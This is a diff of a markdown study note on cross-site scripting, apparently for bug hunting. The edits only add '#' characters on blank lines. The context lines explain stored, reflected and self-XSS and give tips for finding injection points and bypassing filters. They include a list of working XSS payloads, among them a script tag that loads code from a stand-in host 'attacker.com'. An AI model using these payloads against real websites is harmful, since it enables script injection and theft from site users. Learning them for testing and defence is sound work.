@@ -1,5 +1,5 @@
 ### Types of XSS
-
+#
 * XSS happens when scripts run on a victim's browser when a website cant tell the difference betweene user input and website code.
 * **Stored XSS** - When user input is stored on a server and retrieved later unsafely.
     * Although they weren't properly sanitized being injected, scripts could be escaped/sanitized if it was being retrieved 
@@ -24,7 +24,7 @@
   * **Self-XSS** - a social engineering attack that tricks users into executing a XSS intructed by the attacker.
 
 ### Hunting for XSS
-   
+#   
   * The <script> tag are unlikely to work on their own, you must use different methods.
   * HTML attributes:
       * onlick
@@ -40,7 +40,7 @@
       * IMAGE URL will be inserted in a <img> tag when the image is rendered.
   * **Take note of which characters are being rendered directly and which ones are escaped.**
 ###  Common payloads
-
+#
 * <script> alert(1) </script>
 * <iframe src = javascript: alert(1) >
 * <<span>body onload=alert(1)>
@@ -51,13 +51,13 @@
 * <script src=//attacker.com/test.js>
 
 ### Other test methods
-
+#
 * Test strings: 
     * <span>> , ' , <span>< , <span>" ,  // , : , = , ; , ! , --
     * Fuzzing
 
 ### Bypassing filters
-
+#
 * Mix different encodings and capitilizations to confuse filters.
 * HTML allows for syntax errors in capitilzations
 * If special characters are filtered, you cant write strings into a payload directly.
